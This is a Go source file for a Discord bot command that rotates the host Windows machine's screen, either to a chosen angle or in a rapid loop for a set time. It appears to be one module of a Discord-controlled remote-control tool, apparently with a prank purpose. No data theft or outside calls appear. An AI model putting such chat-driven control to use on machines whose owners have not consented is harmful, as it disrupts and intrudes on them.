package commands_screen

import (
	"fmt"
	"time"

	"radithor/bot/discord"
	"radithor/funcs"
	"radithor/utils"

	"github.com/horobimasu/windowsx"
)

func rotate(ctx *discord.CommandContext, args []string) {
	if len(args) < 1 {
		ctx.ReplyMsg("You need to provide a flag.")
		return
	}

	screenName := utils.UnwrapQuotes(args)

	if utils.HasFlag(args, "loop") {
		timeout, found := utils.FindNumber(args)
		if !found {
			ctx.ReplyMsg("You need to provde a number as the timeout.")
			return
		}

		msg, _ := ctx.ReplyMsg("Rotating screen...")

		until := time.Now().Add(time.Duration(timeout) * time.Second)
		for i := 0; time.Now().Before(until); i = (i + 1) % 4 {
			funcs.SetScreenOrientation(screenName, uint32(i))
			time.Sleep(500 * time.Millisecond)
		}

		funcs.SetScreenOrientation(screenName, windowsx.DMDO_DEFAULT)

		ctx.DeleteMsg(msg.ID)
		ctx.ReplyMsg("Successfully rotated screen!")
		return
	}

	var err error

	switch {
	case utils.HasFlag(args, "0"):
		err = funcs.SetScreenOrientation(screenName, windowsx.DMDO_DEFAULT)

	case utils.HasFlag(args, "90"):
		err = funcs.SetScreenOrientation(screenName, windowsx.DMDO_90)

	case utils.HasFlag(args, "180"):
		err = funcs.SetScreenOrientation(screenName, windowsx.DMDO_180)

	case utils.HasFlag(args, "270"):
		err = funcs.SetScreenOrientation(screenName, windowsx.DMDO_270)

	default:
		ctx.ReplyMsg("You need to provide the orientation as -0, -90, -180 or -270.")
		return
	}

	if err != nil {
		ctx.ReplyMsg(fmt.Sprintf("Failed to rotate screen - %v", err))
		return
	}

	ctx.ReplyMsg("Successfully rotated screen!")
}
